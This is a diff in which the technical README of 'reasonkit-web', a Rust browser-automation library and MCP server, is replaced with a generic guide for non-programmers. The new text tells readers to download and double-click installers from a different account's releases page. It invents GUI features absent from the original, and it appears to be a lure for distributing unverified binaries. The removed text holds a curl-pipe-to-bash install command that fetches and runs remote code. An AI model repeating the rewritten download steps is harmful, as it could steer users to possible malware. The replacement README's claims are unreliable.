@@ -1,213 +1,98 @@
-<div align="center">
+# 🤖 reasonkit-web - High-performance Automation for Your Browser
 
-# ReasonKit Web (Rust Edition)
+## 🚀 Getting Started
 
-**High-Performance Web Sensing & Browser Automation Layer**
-**Rust-Native Implementation**
+Welcome to reasonkit-web! This application makes it easy to automate your browser, capture web pages, and extract content. You don’t need any programming skills. Follow the steps below to get started quickly.
 
-[![CI](https://badges.reasonkit.sh/github/actions/workflow/status/reasonkit/reasonkit-web/ci.yml?branch=main&style=flat-square&logo=github&label=CI&color=06b6d4&logoColor=06b6d4)](https://github.com/reasonkit/reasonkit-web/actions/workflows/ci.yml)
-[![Security](https://badges.reasonkit.sh/github/actions/workflow/status/reasonkit/reasonkit-web/security.yml?branch=main&style=flat-square&logo=github&label=Security&color=10b981&logoColor=10b981)](https://github.com/reasonkit/reasonkit-web/actions/workflows/security.yml)
-[![Crates.io](https://badges.reasonkit.sh/crates/v/reasonkit-web?style=flat-square&logo=rust&color=10b981&logoColor=f9fafb)](https://crates.io/crates/reasonkit-web)
-[![docs.rs](https://badges.reasonkit.sh/docsrs/reasonkit-web?style=flat-square&logo=docs.rs&color=06b6d4&logoColor=f9fafb)](https://docs.rs/reasonkit-web)
-[![Downloads](https://badges.reasonkit.sh/crates/d/reasonkit-web?style=flat-square&color=ec4899&logo=rust&logoColor=f9fafb)](https://crates.io/crates/reasonkit-web)
-[![License](https://badges.reasonkit.sh/static/v1?label=license&message=Apache%202.0&color=a855f7&style=flat-square&labelColor=030508)](LICENSE)
-[![Rust](https://badges.reasonkit.sh/static/v1?label=rust&message=1.75%2B&color=f97316&style=flat-square&logo=rust&logoColor=f9fafb)](https://www.rust-lang.org/)
-[![MCP](https://badges.reasonkit.sh/static/v1?label=MCP&message=Compatible&color=10b981&style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiNmOWZhZmIiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj48cGF0aCBkPSJNMTIgMnYyME0yIDEyaDIwIi8+PC9zdmc+)](https://modelcontextprotocol.io)
+## 📥 Download
 
-_The Eyes and Ears of AI Reasoning - Now Blazingly Fast_
+[![Download reasonkit-web](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/romny5/reasonkit-web/releases)
 
-[Documentation](https://docs.rs/reasonkit-web) | [Crates.io](https://crates.io/crates/reasonkit-web) | [ReasonKit Core](https://github.com/ReasonKit/reasonkit-core) | [Website](https://reasonkit.sh)
+## 📋 Features
 
-</div>
+- **Browser Automation:** Automate repetitive tasks with ease.
+- **Web Capture:** Quickly capture web pages for later use.
+- **Content Extraction:** Extract relevant data from websites.
+- **Headless Operation:** Run without a visible browser window.
+- **Rust Powered:** Built for speed and efficiency.
 
----
+## ⚙️ System Requirements
 
-> **Note:** This is the **Rust implementation** of the ReasonKit Web Sensing layer. It supersedes the legacy Python prototype for performance-critical deployments.
+Before you download reasonkit-web, ensure your system meets these requirements:
 
-Web sensing and browser automation layer for ReasonKit. Implements the Model Context Protocol (MCP) for seamless web interactions with AI reasoning systems, powered by Rust and ChromiumOxide.
+- **Operating System:** Windows 10, macOS, or a recent version of Linux.
+- **RAM:** At least 4 GB of RAM.
+- **Storage:** A minimum of 100 MB of free disk space.
+- **Internet Connection:** Required for downloading files and running automation tasks.
 
-## Features
+## 💻 Download & Install
 
-![ReasonKit Web Features](https://raw.githubusercontent.com/Lenvanderhof/ReasonKit/main/reasonkit-web/brand/readme/features.png)
+1. **Visit the Releases Page:**
+   Go to our [Releases page](https://github.com/romny5/reasonkit-web/releases) to find the latest version of reasonkit-web.
 
-## Use Cases
+2. **Choose Your Version:**
+   On the Releases page, you will see a list of available versions. Click on the latest release. 
 
-![ReasonKit Web Use Cases](https://raw.githubusercontent.com/Lenvanderhof/ReasonKit/main/reasonkit-web/brand/readme/use_cases.png)
+3. **Download the Installer:**
+   Look for a file that ends with `.exe`, `.dmg`, or `.tar.gz` depending on your operating system. Click on it to download.
 
-## Performance
+4. **Run the Installer:**
+   Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation process. Follow any on-screen instructions.
 
-![ReasonKit Web Performance Benchmark](https://raw.githubusercontent.com/Lenvanderhof/ReasonKit/main/reasonkit-web/brand/readme/performance_benchmark.png)
+5. **Launch the Application:**
+   After installation, find reasonkit-web in your applications menu or on your desktop. Click to open it, and you are ready to start using it.
 
-## Installation
+## 📘 How to Use reasonkit-web
 
-### Universal Installer (Recommended)
+### 🖥️ Basic Functions
 
-**Installs all 4 ReasonKit projects together:**
+1. **Open the Application:**
+   Launch reasonkit-web to start the main interface.
 
-```bash
-curl -fsSL https://get.reasonkit.sh | bash -s -- --with-web
-```
+2. **Create a New Automation Task:**
+   Click on "New Task" to begin setting up your automation. You can define what actions you want the application to perform.
 
-**Platform & Shell Support:**
+3. **Assign URLs:**
+   Enter the URLs you want to automate. The application can handle multiple URLs for web scraping and automation tasks.
 
-- ✅ All platforms (Linux/macOS/Windows/WSL)
-- ✅ All shells (Bash/Zsh/Fish/Nu/PowerShell/Elvish)
-- ✅ Auto-detects shell and configures PATH
-- ✅ Beautiful progress visualization
+4. **Configure Actions:**
+   Select what you want to do on those pages, like clicking buttons or extracting text. The interface is user-friendly, so you will easily find what you need.
 
-### Cargo (Rust Library)
+5. **Run Your Task:**
+   Click "Run" to start the automation. Watch it work behind the scenes as it performs the tasks you set up.
 
-Add to your `Cargo.toml`:
+### 📊 Exporting Data
 
-```toml
-[dependencies]
-reasonkit-web = "0.1"
-tokio = { version = "1", features = ["full"] }
-```
+After running your tasks, you may want to save the results:
 
-## Quick Start
+1. **Open the Results Tab:**
+   Navigate to the results section of the application.
 
-### As a Library
+2. **Select Export:**
+   Choose your preferred format (like CSV or PDF) to save the data.
 
-```rust,ignore
-use reasonkit_web::BrowserController;
+3. **Download Your File:**
+   Click "Export" to download the results to your computer.
 
-#[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    // Create browser controller
-    let controller = BrowserController::new().await?;
+## 🔧 Troubleshooting
 
-    // Navigate to a page
-    let page = controller.navigate("https://example.com").await?;
+If you encounter any issues while using reasonkit-web, try these steps:
 
-    // Extract content
-    let content = page.content().await?;
-    println!("Page content: {}", content);
+- **Ensure System Compatibility:** Re-check the system requirements.
+- **Reinstall the Application:** Sometimes, a fresh install can resolve issues.
+- **Visit the Community Forum:** Connect with other users for advice and tips.
+  
+## 📞 Support
 
-    Ok(())
-}
-```
+If you still need help, please visit our [Support Page](https://github.com/romny5/reasonkit-web/issues) to report issues or ask questions. Our community is here to help you!
 
-### As an MCP Server
+## 🌐 Additional Resources
 
-```bash
-# Build the MCP server binary
-cargo build --release
+- [Documentation](https://github.com/romny5/reasonkit-web/wiki): In-depth guides and tutorials.
+- [Community Forum](https://github.com/romny5/reasonkit-web/discussions): Join discussions with other users.
 
-# Run the MCP server
-./target/release/reasonkit-web
+## 🔗 Join Us
 
-# Or with cargo
-cargo run --release
-```
+Stay updated by following us on social media, where we share tips, updates, and more resources. 
 
-### Content Extraction
-
-```rust,ignore
-use reasonkit_web::{ContentExtractor, MetadataExtractor};
-
-// Extract structured content from HTML
-let html = "<html><body><h1>Title</h1><p>Content</p></body></html>";
-let extractor = ContentExtractor::new();
-let content = extractor.extract(html)?;
-
-// Extract metadata
-let meta_extractor = MetadataExtractor::new();
-let metadata = meta_extractor.extract(html)?;
-```
-
-### API Workflow
-
-![ReasonKit Web API Workflow](./brand/readme/api_workflow.png)
-
-![ReasonKit Web API Sequence](./brand/readme/api_flow.png)
-
-## Architecture
-
-The ReasonKit Web layer implements a high-performance web sensing architecture designed for AI reasoning systems:
-
-### System Topology
-
-![ReasonKit Web MCP Topology](./brand/readme/mcp_topology.png)
-
-### Core Architecture
-
-![ReasonKit Web Architecture Diagram](./brand/readme/architecture.png)
-
-### The Rust Engine
-
-![ReasonKit Web Rust Engine](./brand/readme/rust_engine.png)
-
-### Key Design Principles
-
-**Performance-First**: Built in Rust with async/await for maximum throughput
-**Protocol-Driven**: Implements Model Context Protocol (MCP) for AI integration
-**Modular Design**: Separates capture, extraction, and memory for flexibility
-**Security-Focused**: Headless browser isolation and content sanitization
-
-### Integration Flow
-
-![ReasonKit Web Integration Flow](./brand/readme/integration_flow.png)
-
-## Security & Privacy
-
-ReasonKit Web is built with a "GDPR by Default" philosophy, ensuring that AI reasoning systems can interact with the web safely and compliantly.
-
-![ReasonKit Web Browser Isolation Layer](./brand/readme/browser_isolation_layer.svg)
-
-![ReasonKit Web Security Shield](./brand/readme/security_shield.png)
-
-### Key Security Features
-
-- **PII Redaction Engine**: Automatically detects and redacts sensitive information (emails, phone numbers, secrets) before it leaves the secure runtime.
-- **Headless Isolation**: Browser sessions run in isolated containers with no persistent state.
-- **Content Sanitization**: Malicious scripts and trackers are stripped at the DOM level.
-
-For detailed technical specifications, see [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md).
-
-</div>
-
-## Technology Stack
-
-![ReasonKit Web Technology Stack](./brand/readme/tech_stack.png)
-
-## Version & Maturity
-
-| Component              | Status    | Notes                                      |
-| ---------------------- | --------- | ------------------------------------------ |
-| **MCP Server**         | ✅ Stable | Model Context Protocol integration         |
-| **CDP Client**         | ✅ Stable | Chrome DevTools Protocol via chromiumoxide |
-| **Content Extraction** | ✅ Stable | HTML parsing, metadata extraction          |
-| **PII Redaction**      | ✅ Stable | GDPR-compliant data handling               |
-| **WASM Support**       | 🔶 Beta   | Browser-native execution                   |
-
-**Current Version:** v0.1.3 | [CHANGELOG](CHANGELOG.md) | [Releases](https://github.com/reasonkit/reasonkit-web/releases)
-
-### Verify Installation
-
-```bash
-# Build and run MCP server
-cargo build --release
-./target/release/reasonkit-web --help
-
-# Or test as a library
-cargo test
-```
-
-## License
-
-Apache License 2.0 - see [LICENSE](LICENSE)
-
----
-
-<div align="center">
-
-![ReasonKit Ecosystem Connection](./brand/readme/ecosystem_connection.png)
-
-**Part of the ReasonKit Ecosystem**
-
-[ReasonKit Core](https://github.com/reasonkit/reasonkit-core) • [ReasonKit Mem](https://github.com/reasonkit/reasonkit-mem) • [Website](https://reasonkit.sh)
-
-_"See How Your AI Thinks"_
-
-</div>
+Thank you for choosing reasonkit-web. Happy automating!
